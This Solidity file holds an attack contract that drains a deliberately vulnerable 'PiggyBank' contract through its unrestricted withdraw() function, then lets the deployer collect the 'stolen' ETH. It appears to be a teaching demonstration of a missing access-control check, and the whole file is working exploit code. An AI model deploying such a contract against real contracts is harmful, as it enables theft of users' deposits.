// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerablePiggyBank.sol";

/**
 * @title SimpleAttacker
 * @dev Attack contract that exploits the VulnerablePiggyBank's access control vulnerability
 * 
 * This contract demonstrates how the vulnerable PiggyBank can be drained by any user
 * due to the lack of access control on the withdraw() function.
 * 
 * Attack Vector: Access Control Bypass
 * - The vulnerable contract's withdraw() function has no access restrictions
 * - Any address can call withdraw() and receive ALL funds in the contract
 * - This attack works regardless of who deposited the funds originally
 */
contract SimpleAttacker {
    VulnerablePiggyBank public target;
    address public attacker;
    
    event AttackExecuted(address indexed attacker, uint256 stolenAmount);
    
    /**
     * @dev Constructor sets the target vulnerable contract
     * @param _target Address of the deployed VulnerablePiggyBank contract
     */
    constructor(address _target) {
        target = VulnerablePiggyBank(_target);
        attacker = msg.sender;
    }
    
    /**
     * @dev Execute the attack - drain all funds from vulnerable contract
     * @notice This function exploits the access control vulnerability
     * 
     * Attack Flow:
     * 1. Call target.withdraw() 
     * 2. Vulnerable contract sends ALL its balance to this contract
     * 3. Attack complete - all user deposits stolen
     */
    function attack() public {
        require(msg.sender == attacker, "Only deployer can execute attack");
        
        uint256 targetBalance = address(target).balance;
        require(targetBalance > 0, "Target contract has no funds to steal");
        
        // Execute the attack - call vulnerable withdraw function
        target.withdraw();
        
        emit AttackExecuted(msg.sender, targetBalance);
    }
    
    /**
     * @dev Receive function to accept stolen ETH
     * @notice This function receives the drained funds from the vulnerable contract
     */
    receive() external payable {
        // Successfully received stolen funds
    }
    
    /**
     * @dev Fallback function for any other calls
     */
    fallback() external payable {
        // Handle unexpected calls
    }
    
    /**
     * @dev Get the balance stolen by this contract
     * @return Amount of ETH stolen and held by this contract
     */
    function getStolenAmount() public view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @dev Allow attacker to withdraw stolen funds (for demonstration)
     * @notice In a real attack, attacker would transfer funds to their personal wallet
     */
    function withdrawStolenFunds() public {
        require(msg.sender == attacker, "Only attacker can withdraw");
        payable(attacker).transfer(address(this).balance);
    }
    
    /**
     * @dev Check if target contract has funds available to steal
     * @return Boolean indicating if target has funds
     */
    function canAttack() public view returns (bool) {
        return address(target).balance > 0;
    }
}